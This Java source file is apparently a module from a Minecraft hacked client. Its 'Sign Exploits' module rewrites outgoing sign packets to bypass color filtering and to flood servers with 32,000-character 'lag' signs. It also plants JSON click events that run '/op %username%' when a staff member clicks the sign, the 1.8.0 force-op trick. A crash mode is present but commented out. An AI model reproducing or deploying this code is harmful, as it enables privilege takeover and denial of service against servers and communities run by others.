/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit;

import de.florianmichael.rclasses.common.StringUtils;
import de.florianmichael.rclasses.pattern.functional.IName;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.event.cancellable.network.OutgoingPacketListener;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.base.value.impl.selection.EnumModeValue;
import de.nekosarekawaii.vandalism.feature.module.AbstractModule;
import de.nekosarekawaii.vandalism.feature.script.parse.ScriptVariable;
import de.nekosarekawaii.vandalism.util.ViaVersionUtil;
import de.nekosarekawaii.vandalism.util.game.ChatUtil;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.Formatting;
import net.minecraft.util.math.BlockPos;

public class SignExploitsModule extends AbstractModule implements OutgoingPacketListener {

    private final EnumModeValue<Mode> mode = new EnumModeValue<>(
            this,
            "Mode",
            "Change the mode.",
            Mode.COLOR_BYPASS,
            Mode.values()
    );

    private final StringValue line1Command = new StringValue(
            this,
            "Line 1 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line2Command = new StringValue(
            this,
            "Line 2 Command",
            "The command to run when the second line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line3Command = new StringValue(
            this,
            "Line 3 Command",
            "The command to run when the third line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line4Command = new StringValue(
            this,
            "Line 4 Command",
            "The command to run when the fourth line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final IntegerValue characterCount = new IntegerValue(
            this,
            "Character Count",
            "The amount of characters to put into every line of the lag sign.",
            32000,
            1000,
            32000
    ).visibleCondition(() -> this.mode.getValue() == Mode.LAG);

    private enum Mode implements IName {
        COLOR_BYPASS, LAG, CRASH, COMMAND;

        private final String name;

        Mode() {
            this.name = StringUtils.normalizeEnumName(this.name());
        }

        @Override
        public String getName() {
            return this.name;
        }

    }

    public SignExploitsModule() {
        super(
                "Sign Exploits",
                "Various exploits that use signs for example 1.8.0 force op.",
                Category.EXPLOIT
        );
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(OutgoingPacketEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(OutgoingPacketEvent.ID, this);
    }

    @Override
    public void onOutgoingPacket(final OutgoingPacketEvent event) {
        final Packet<?> packet = event.packet;
        if (packet instanceof final UpdateSignC2SPacket signPacket) {
            final BlockPos pos = signPacket.getPos();
            String[] text = signPacket.getText();
            switch (this.mode.getValue()) {
                case COLOR_BYPASS -> {
                    final String[] newText = new String[4];
                    final String prefix = String.valueOf(Formatting.FORMATTING_CODE_PREFIX);
                    for (int i = 0; i < 4; i++) {
                        for (final Formatting formatting : Formatting.values()) {
                            String textLine = text[i];
                            final String code = String.valueOf(formatting.getCode());
                            final String colorCode = prefix + code;
                            if (textLine.contains(colorCode)) {
                                textLine = textLine.replace(
                                        colorCode, prefix + prefix + code + code
                                );
                            }
                            newText[i] = textLine;
                        }
                    }
                    text = newText;
                    event.packet = new UpdateSignC2SPacket(pos, true, text[0], text[1], text[2], text[3]);
                }
                case LAG -> {
                    final String lagText = "{\"text\":\"" + "x".repeat(this.characterCount.getValue()) + "\"}";
                    ViaVersionUtil.send1_8SignUpdatePacket(
                            pos,
                            lagText,
                            lagText,
                            lagText,
                            lagText
                    );
                    event.cancel();
                }
                case CRASH -> {
                    /**
                     *             C12PacketUpdateSign p = new C12PacketUpdateSign(
                     *                sign.getPos(), new IChatComponent[]{new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText("")}
                     *             );
                     *             ChatComponentTranslation trans = new ChatComponentTranslation("options.snooper.desc");
                     *             IChatComponent send = new ChatComponentText("                           ");
                     *
                     *             for(int i = 0; i < 8; ++i) {
                     *                send.appendSibling(trans);
                     *             }
                     *
                     *             for(int i = 0; i < 4; ++i) {
                     *                p.getLines()[i].appendSibling(send);
                     *             }
                     *
                     *             this.mc.thePlayer.sendQueue.addToSendQueue(p);
                     */
                    /*final TranslationComponent trans = new TranslationComponent("options.snooper.desc");
                    final StringComponent send = new StringComponent("                           ");
                    for (int i = 0; i < 8; ++i) {
                        send.append(trans);
                    }
                    final StringComponent line = new StringComponent("");
                    line.append(send);
                    final String crashText = TextComponentSerializer.V1_8.serialize(line);
                    System.out.println(crashText);
                    ViaVersionUtil.send1_8SignUpdatePacket(
                            pos,
                            crashText,
                            crashText,
                            crashText,
                            crashText
                    );
                    event.cancel();*/
                    ChatUtil.errorChatMessage("This feature is not implemented yet.");
                }
                case COMMAND -> {
                    /*final StringComponent signText = new StringComponent("");
                    signText.setStyle(new Style().setClickEvent(new ClickEvent(
                            ClickEventAction.RUN_COMMAND,
                            this.line1Command.getValue()
                    )));
                    System.out.println(TextComponentSerializer.V1_8.serialize(signText));*/
                    ViaVersionUtil.send1_8SignUpdatePacket(
                            pos,
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line1Command.getValue()) + "\"},\"text\":\"\"}",
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line2Command.getValue()) + "\"},\"text\":\"\"}",
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line3Command.getValue()) + "\"},\"text\":\"\"}",
                            "{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + ScriptVariable.applyReplacements(this.line4Command.getValue()) + "\"},\"text\":\"\"}"
                    );
                    event.cancel();
                }
            }
        }
    }

}
